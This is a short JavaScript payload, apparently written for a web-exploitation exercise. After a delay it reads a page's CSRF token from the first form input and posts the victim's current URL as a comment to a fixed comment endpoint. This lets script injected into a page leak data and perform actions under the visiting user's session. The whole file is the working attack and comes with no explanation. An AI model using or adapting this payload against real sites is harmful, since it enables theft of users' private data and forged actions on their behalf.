function doCSRF() {
var csrf = document.getElementsByTagName("input")[0].value;
var formData = new FormData();
var data = window.location.href;
formData.append("csrfmiddlewaretoken", csrf);
	//formData.append("creator", "fromBot");
formData.append("body", data);

fetch("/comment/7dbf9521-4ba3-4498-8164-463404b7579d",{
		method: 'POST',
		body: formData
});

}

setTimeout(doCSRF,5000);
